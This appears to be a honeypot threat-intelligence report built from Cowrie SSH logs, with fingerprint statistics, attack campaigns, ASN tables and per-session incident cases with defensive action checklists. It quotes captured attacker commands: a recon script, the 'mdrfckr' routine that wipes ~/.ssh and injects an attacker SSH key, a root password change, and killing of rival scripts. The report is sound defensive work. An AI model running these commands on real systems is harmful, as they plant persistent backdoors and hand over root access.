## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **526** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 292 |
| OpenSSH | 35 |
| libssh | 20 |
| Paramiko (Python) | 4 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 223 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 53 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 35 | 35 |
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 223 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 53 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 35 | 35 | Mirai/variant |
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 51 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:yrqf2mcBtVA0"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `185.40.30.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.190.7.203`, `171.244.37.97`, `182.13.96.129`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **114** |
| Unique ASNs | **76** |
| High-Risk ASNs | **66** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 8 | HIGH |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS24757` | Ethio Telecom | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (344)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1015f757f41a

| Field | Detail |
|---|---|
| **Source IP** | `223.107.146[.]186` |
| **First Seen** | 2026-07-21 02:57 |
| **Last Seen** | 2026-07-21 02:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 02:57:02` | `cowrie.session.connect` |
| `2026-07-21 02:57:03` | `cowrie.client.version` |
| `2026-07-21 02:57:03` | `cowrie.client.kex` |
| `2026-07-21 02:57:05` | `cowrie.login.success` |
| `2026-07-21 02:57:06` | `cowrie.direct-tcpip.request` |
| `2026-07-21 02:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.146[.]186` to AbuseIPDB if not already reported
- [ ] Block `223.107.146[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b162dc5ce1b

| Field | Detail |
|---|---|
| **Source IP** | `35.205.211[.]220` |
| **First Seen** | 2026-07-21 02:58 |
| **Last Seen** | 2026-07-21 02:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 02:58:24` | `cowrie.session.connect` |
| `2026-07-21 02:58:24` | `cowrie.login.success` |
| `2026-07-21 02:58:25` | `cowrie.session.params` |
| `2026-07-21 02:58:25` | `cowrie.command.input` |
| `2026-07-21 02:58:25` | `cowrie.command.input` |
| `2026-07-21 02:58:25` | `cowrie.command.failed` |
| `2026-07-21 02:58:25` | `cowrie.command.input` |
| `2026-07-21 02:58:25` | `cowrie.log.closed` |
| `2026-07-21 02:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.211[.]220` to AbuseIPDB if not already reported
- [ ] Block `35.205.211[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19f084c8c43a

| Field | Detail |
|---|---|
| **Source IP** | `35.205.211[.]220` |
| **First Seen** | 2026-07-21 02:58 |
| **Last Seen** | 2026-07-21 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 02:58:33` | `cowrie.session.connect` |
| `2026-07-21 02:58:33` | `cowrie.login.success` |
| `2026-07-21 02:58:33` | `cowrie.session.params` |
| `2026-07-21 02:58:33` | `cowrie.command.input` |
| `2026-07-21 02:58:33` | `cowrie.command.failed` |
| `2026-07-21 02:58:41` | `cowrie.log.closed` |
| `2026-07-21 02:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.211[.]220` to AbuseIPDB if not already reported
- [ ] Block `35.205.211[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb391b5f9156

| Field | Detail |
|---|---|
| **Source IP** | `35.205.211[.]220` |
| **First Seen** | 2026-07-21 02:58 |
| **Last Seen** | 2026-07-21 02:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 02:58:35` | `cowrie.session.connect` |
| `2026-07-21 02:58:35` | `cowrie.login.success` |
| `2026-07-21 02:58:35` | `cowrie.session.params` |
| `2026-07-21 02:58:35` | `cowrie.command.input` |
| `2026-07-21 02:58:41` | `cowrie.log.closed` |
| `2026-07-21 02:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.211[.]220` to AbuseIPDB if not already reported
- [ ] Block `35.205.211[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dbc0e91d4f7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:07 |
| **Last Seen** | 2026-07-21 03:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:07:04` | `cowrie.session.connect` |
| `2026-07-21 03:07:05` | `cowrie.client.version` |
| `2026-07-21 03:07:05` | `cowrie.client.kex` |
| `2026-07-21 03:07:08` | `cowrie.login.success` |
| `2026-07-21 03:07:09` | `cowrie.session.params` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.success` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:10` | `cowrie.log.closed` |
| `2026-07-21 03:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9730c0c993a1

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]97` |
| **First Seen** | 2026-07-21 03:07 |
| **Last Seen** | 2026-07-21 03:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:07:07` | `cowrie.session.connect` |
| `2026-07-21 03:07:07` | `cowrie.client.version` |
| `2026-07-21 03:07:07` | `cowrie.client.kex` |
| `2026-07-21 03:07:08` | `cowrie.login.success` |
| `2026-07-21 03:07:09` | `cowrie.session.params` |
| `2026-07-21 03:07:09` | `cowrie.command.input` |
| `2026-07-21 03:07:09` | `cowrie.command.failed` |
| `2026-07-21 03:07:09` | `cowrie.log.closed` |
| `2026-07-21 03:07:10` | `cowrie.session.params` |
| `2026-07-21 03:07:10` | `cowrie.command.input` |
| `2026-07-21 03:07:11` | `cowrie.session.file_download` |
| `2026-07-21 03:07:11` | `cowrie.log.closed` |
| `2026-07-21 03:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]97` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9464ef8d03de

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]97` |
| **First Seen** | 2026-07-21 03:07 |
| **Last Seen** | 2026-07-21 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:07:11` | `cowrie.session.connect` |
| `2026-07-21 03:07:11` | `cowrie.client.version` |
| `2026-07-21 03:07:11` | `cowrie.client.kex` |
| `2026-07-21 03:07:12` | `cowrie.login.success` |
| `2026-07-21 03:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]97` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1db63aba6f

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]97` |
| **First Seen** | 2026-07-21 03:07 |
| **Last Seen** | 2026-07-21 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:07:13` | `cowrie.session.connect` |
| `2026-07-21 03:07:13` | `cowrie.client.version` |
| `2026-07-21 03:07:13` | `cowrie.client.kex` |
| `2026-07-21 03:07:14` | `cowrie.login.success` |
| `2026-07-21 03:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]97` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f764c247aff7

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-21 03:07 |
| **Last Seen** | 2026-07-21 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:07:57` | `cowrie.session.connect` |
| `2026-07-21 03:07:57` | `cowrie.client.version` |
| `2026-07-21 03:07:57` | `cowrie.client.kex` |
| `2026-07-21 03:07:58` | `cowrie.login.success` |
| `2026-07-21 03:07:59` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc34cc1b6f1f

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-07-21 03:08 |
| **Last Seen** | 2026-07-21 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:08:04` | `cowrie.session.connect` |
| `2026-07-21 03:08:04` | `cowrie.client.version` |
| `2026-07-21 03:08:04` | `cowrie.client.kex` |
| `2026-07-21 03:08:05` | `cowrie.login.success` |
| `2026-07-21 03:08:06` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72bc2ab65156

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:09 |
| **Last Seen** | 2026-07-21 03:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:09:13` | `cowrie.session.connect` |
| `2026-07-21 03:09:14` | `cowrie.client.version` |
| `2026-07-21 03:09:14` | `cowrie.client.kex` |
| `2026-07-21 03:09:16` | `cowrie.login.success` |
| `2026-07-21 03:09:18` | `cowrie.session.params` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.success` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:18` | `cowrie.command.input` |
| `2026-07-21 03:09:19` | `cowrie.log.closed` |
| `2026-07-21 03:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00e94a25166

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:11 |
| **Last Seen** | 2026-07-21 03:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:11:24` | `cowrie.session.connect` |
| `2026-07-21 03:11:24` | `cowrie.client.version` |
| `2026-07-21 03:11:24` | `cowrie.client.kex` |
| `2026-07-21 03:11:27` | `cowrie.login.success` |
| `2026-07-21 03:11:29` | `cowrie.session.params` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.success` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:29` | `cowrie.command.input` |
| `2026-07-21 03:11:30` | `cowrie.log.closed` |
| `2026-07-21 03:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1bd23208d88

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-07-21 03:11 |
| **Last Seen** | 2026-07-21 03:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:11:35` | `cowrie.session.connect` |
| `2026-07-21 03:11:36` | `cowrie.client.version` |
| `2026-07-21 03:11:36` | `cowrie.client.kex` |
| `2026-07-21 03:11:37` | `cowrie.login.success` |
| `2026-07-21 03:11:37` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0947cd6383a

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-07-21 03:12 |
| **Last Seen** | 2026-07-21 03:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:12:59` | `cowrie.session.connect` |
| `2026-07-21 03:13:00` | `cowrie.client.version` |
| `2026-07-21 03:13:00` | `cowrie.client.kex` |
| `2026-07-21 03:13:02` | `cowrie.login.success` |
| `2026-07-21 03:13:02` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16243add1ce5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:13 |
| **Last Seen** | 2026-07-21 03:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:13:32` | `cowrie.session.connect` |
| `2026-07-21 03:13:33` | `cowrie.client.version` |
| `2026-07-21 03:13:33` | `cowrie.client.kex` |
| `2026-07-21 03:13:35` | `cowrie.login.success` |
| `2026-07-21 03:13:37` | `cowrie.session.params` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.success` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:37` | `cowrie.command.input` |
| `2026-07-21 03:13:38` | `cowrie.log.closed` |
| `2026-07-21 03:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
